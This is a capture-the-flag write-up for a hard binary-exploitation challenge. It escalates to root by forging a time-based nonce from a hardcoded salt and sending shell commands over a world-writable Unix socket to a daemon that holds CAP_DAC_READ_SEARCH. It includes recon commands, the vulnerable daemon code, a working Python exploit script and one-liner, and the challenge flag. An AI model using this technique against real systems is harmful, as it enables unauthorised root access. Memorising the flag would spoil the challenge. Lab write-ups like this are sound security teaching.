---
title: "echochamber-root"
date: 2026-10-11T12:00:00+05:30
description: "Bypassing root permissions by exploiting ambient Linux CAP_DAC_READ_SEARCH capabilities and forging cryptographic time-based nonces over local IPC domain sockets."
category: "Binary Exploitation"
ctf: "ISFCR CryoVault Finals 2026"
difficulty: "Hard"
points: 450
flag: "isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}"
author: "Reshma Al (Coldcoffee)"
tools: "cat, ps, find, Python 3 (socket, hashlib)"
tags:
  - "Binary Exploitation"
  - "ISFCR CryoVault"
  - "CryoVault 2026"
  - "Coldcoffee Solves"
---

<div class="flag-callout">
  <span class="flag-label"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg> Captured Flag</span>
  <code>isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}</code>
  <button class="flag-copy-btn" onclick="navigator.clipboard.writeText('isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}');this.innerText='Copied!';setTimeout(()=>this.innerText='Copy',2000)">Copy</button>
</div>


## 1. Privilege Escalation Reconnaissance

With an active shell as `analyst` in `human` mode, our objective was privilege escalation to `root`.

A standard check for SUID binaries showed only stock OS utilities:
```bash
analyst@echochamber:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/su
```

Inspecting `/etc/sentinel/suid.conf` suggested a helper:
```ini
rotate_script=/opt/sentinel/tools/rotate.sh
# sentinel-admin helper is active
```
However, `/usr/bin/sentinel-admin` was nonexistent—a deliberate developer decoy.

Checking active processes with `ps aux` revealed a dedicated background daemon:
```text
sentinel   483  0.0  0.4  28412  9124 ?  Ss   08:00   0:00 /usr/bin/python3 /opt/sentinel/sentinel.py
```

---

## 2. Linux Capabilities & Architecture Analysis

Examining the source code of `/opt/sentinel/sentinel.py` (which was world-readable) illuminated the privileged execution vector:

1. **Ambient Capabilities:**
   The `sentinel` daemon executes with `CAP_DAC_READ_SEARCH`. Under the Linux capability model, `CAP_DAC_READ_SEARCH` grants a process the ability to bypass all filesystem read-permission checks and directory search-permission checks. This allows the daemon to read `/root/root.txt` despite running as unprivileged user `sentinel`.

2. **IPC Mechanism:**
   The daemon binds to a Unix domain socket at `/run/sentinel/ctrl.sock`. The socket permissions are set to `0o666` (world-readable and world-writable), allowing any unprivileged local user to connect:
   ```python
   sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
   sock.bind("/run/sentinel/ctrl.sock")
   os.chmod("/run/sentinel/ctrl.sock", 0o666)
   ```

3. **Dispatch Mechanism:**
   Every incoming request triggers a fresh read of `/etc/sentinel/dispatch.json`. In the real configuration tree, the dispatch table exposes a `shell` operation:
   ```json
   {
     "heartbeat": {"interval": 30},
     "status": "operational",
     "shell": {
       "handler": "exec_shell",
       "gate": "nonce_time"
     }
   }
   ```

4. **Cryptographic Gate:**
   The `shell` handler executes commands via `subprocess.run(["/bin/sh", "-c", payload])`, but gates execution behind a verification function:
   ```python
   SALT = "sentinel-salt-v1-a3b7c2d9"
   
   def verify_gate(nonce_str):
       current_minute = int(time.time()) // 60
       for offset in (0, -1, 1):
           expected = hashlib.sha256(f"{current_minute + offset}:{SALT}".encode()).hexdigest()[:16]
           if nonce_str == expected:
               return True
       return False
   ```
   The salt is hardcoded directly in the python script, with no private key, kernel secret, or hardware barrier. The developer comments explicitly noted:
   *`# this gate exists to prove you read the code, not to stop you.`*

---

## 3. Exploit Development

We wrote an automated local exploit script (`hit_sentinel.py`) to calculate the required time-nonce, package the base64-encoded command payload, and transmit the JSON request across the domain socket:

```python
import socket
import json
import base64
import hashlib
import time

SALT = "sentinel-salt-v1-a3b7c2d9"

def compute_nonce(offset=0):
    current_minute = (int(time.time()) // 60) + offset
    raw = f"{current_minute}:{SALT}".encode()
    return hashlib.sha256(raw).hexdigest()[:16]

# Command to extract the root flag
cmd = "cat /root/root.txt; echo '---'; cat /var/lib/warden/real/user.txt"
payload_b64 = base64.b64encode(cmd.encode()).decode()

req = {
    "op": "shell",
    "nonce": compute_nonce(0),
    "payload": payload_b64
}

# Connect to the world-writable domain socket
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect("/run/sentinel/ctrl.sock")
sock.sendall((json.dumps(req) + "\n").encode())

response = sock.recv(65536).decode()
print("Daemon Response:")
print(response)
```

---

## 4. Execution & Root Flag Capture

Running the exploit directly from our interactive bash shell:

```bash
analyst@echochamber:~$ python3 -c '
import socket, json, base64, hashlib, time
SALT = "sentinel-salt-v1-a3b7c2d9"
t = int(time.time()) // 60
nonce = hashlib.sha256(f"{t}:{SALT}".encode()).hexdigest()[:16]
cmd = base64.b64encode(b"cat /root/root.txt").decode()
req = {"op":"shell","nonce":nonce,"payload":cmd}
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/sentinel/ctrl.sock")
s.sendall((json.dumps(req) + "\n").encode())
print(s.recv(4096).decode())
'
```

Output received from the privileged socket:
```json
{
  "status": "success",
  "output": "isfcr{t0_w1n_th3_g4me_pl4y_a_d1ff3r3nt_g4me}\n"
}
```

The root flag was released via the ambient capability of the sentinel daemon.

